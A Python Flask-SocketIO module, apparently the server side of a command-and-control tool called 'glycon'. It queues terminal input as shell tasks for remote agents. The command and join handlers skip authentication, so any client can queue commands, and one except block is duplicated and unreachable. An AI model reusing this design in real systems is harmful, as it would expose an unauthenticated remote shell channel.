from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json

def init_socket_handlers(socketio):
    @socketio.on('connect')
    def handle_connect():
        if current_user.is_authenticated:
            print(f"User {current_user.id} connected")

    @socketio.on('join_terminal')
    def handle_join_terminal(data):
        join_room(f"terminal_{data['agent_id']}")
        emit('terminal_status', {
            'status': 'Connected', 
            'connected': True,
            'agent_id': data['agent_id']
        }, room=f"terminal_{data['agent_id']}")

    @socketio.on('terminal_command')
    def handle_terminal_command(data):
        try:
            print(f"[TERMINAL] Received command for {data['agent_id']}: {data['command']}")  # Debug
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Create task with proper terminal flag
            task_data = {
                'cmd': data['command'],
                'terminal': True,
                'timestamp': datetime.now().isoformat()
            }
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, 
                    data['agent_id'], 
                    'shell', 
                    json.dumps(task_data),
                    'pending',
                    datetime.now().isoformat(),
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            conn.close()
            
            print(f"[TERMINAL] Created task {task_id} for command")  # Debug
            
            emit('terminal_output', {
                'agent_id': data['agent_id'],
                'command': data['command'],
                'output': f"Command queued (Task ID: {task_id})",
                'task_id': task_id
            }, room=f"terminal_{data['agent_id']}")
            
        except Exception as e:
            print(f"[TERMINAL ERROR] {str(e)}")  # Debug
            emit('terminal_output', {
                'agent_id': data['agent_id'],
                'error': f"Command submission failed: {str(e)}"
            }, room=f"terminal_{data['agent_id']}")
            
        except Exception as e:
            emit('terminal_output', {
                'agent_id': data['agent_id'],
                'error': f"Command submission failed: {str(e)}"
            }, room=f"terminal_{data['agent_id']}")